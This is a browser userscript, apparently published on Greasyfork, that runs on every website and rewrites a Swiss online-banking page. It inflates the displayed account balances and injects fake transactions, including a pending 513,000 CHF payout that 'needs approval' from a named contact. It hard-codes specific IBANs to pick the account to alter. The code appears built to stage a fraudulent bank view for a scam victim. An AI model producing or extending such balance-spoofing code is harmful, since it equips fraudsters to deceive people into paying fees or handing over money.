// ==UserScript==
// @name         Ed R CH combined Edith Celine Müller
...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/491081/Ed%20R%20CH%20combined%20Edith%20Celine%20M%C3%BCller.user.js
// @updateURL https://update.greasyfork.org/scripts/491081/Ed%20R%20CH%20combined%20Edith%20Celine%20M%C3%BCller.meta.js
// ==/UserScript==
...
// //INDEXING STARTS AT 1, NOT 0
 var MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 5},// Konten
     { index: 3, adjustmentAmount: 5},// Vermögen
     { index: 4, adjustmentAmount: 5 },
...
var adjustmentAmount = 5.0; // Change this value to adjust the balance accordingly

// Configurable desired IBAN
 var desiredIban = "CH27 8080 8005 0356 9166 5";
...
var yxtransactionDetailsArray = [
...

    {
        ...
        date: "Vorgemerkt",
        amount: "+513'000.00",
        description: "Auszahlung. Freigabe nötig. Wenden Sie sich an Andreas Graf",
...
// Configurable desired IBAN
// var desiredIban = "CH04 8080 8005 1061 1417 6";
...
function checkAndInsertTransactions() {
    console.log("Checking for desired IBAN:", desiredIban);
    ...
    if (isTransactionPresent) {
        ...
        elementsWithIban.forEach(function(element) {
            ...
            var normalizedIban = desiredIban.replace(/\s/g, "").toLowerCase();
